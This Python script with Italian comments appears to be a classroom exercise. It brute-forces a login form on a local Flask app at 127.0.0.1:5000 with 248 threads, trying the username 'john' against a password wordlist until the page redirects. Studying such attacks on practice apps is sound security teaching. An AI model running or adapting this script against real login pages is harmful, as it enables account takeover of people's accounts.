from concurrent.futures import thread
import requests
from threading import Thread
import sys

NUMERO_THREADS = 248

#thread per trovare la password
class trova (Thread):
    def __init__(self, n, range, file, url):
        Thread.__init__(self)
        self.n = n  #numero univoco del thread (non serve)
        self.range = range #lista di due elementi, sono il range dove il thread prova le password del file
        self.file = file #file di testo con tutti le password
        self.url = url #url iniziale
    def run(self):
        #print(f"THREAD {self.n} INIZIATO [{self.range[0]}, {self.range[1]}]")
        #cerca la password provando le password prese dal file (solo quelle nel range)
        for k in f[self.range[0]:self.range[1]]:
            #variabile per fermare i thread dopo che è stata trovata la password
            global stop

            #il thread manda una post contenente l'username e la password
            payload = {'username': 'john', 'password': k[0:-1]}
            r = requests.post("http://127.0.0.1:5000/", data=payload)

            #ferma tutti i thread se un'altro thread ha trovato la password
            if stop:
                break
            
            #entra nella if se la password è corretta, e quindi è cambiato l'url della pagina
            if self.url != r.url:
                print(f"Password: {k[0:-1]}")
                
                #ferma tutti gli altri threads
                stop = True
                break

        #print(f"THREAD {self.n} FINITO")
        

#apertura del file di testo con tutte le password possibili
f = open("C:/Users/GINOM/Dropbox/Scuola/TPSIT/Esercizi/HTTP/flask_examples/attacco/file.txt", "r").readlines()

#url iniziale per controllare se la password inserita sia giusta
url = requests.get("http://127.0.0.1:5000/").url

#lista di threads
treads = []
stop = False

#controlla se il numero di threads è divisibile per il numero di password all'interno del file
if len(f) % NUMERO_THREADS != 0:
    print("ERRORE, modificare il numero di threads")
    sys.exit()

#for che crea e avvia i threads
for k in range(NUMERO_THREADS):
    treads.append(trova(k, [len(f) // NUMERO_THREADS * k, len(f) // NUMERO_THREADS * (k+1) - 1], f, url))
    treads[k].start()


#treads.append(trova([len(f) // NUMERO_THREADS * k, len(f) // NUMERO_THREADS * (k+1) - 1], f, url))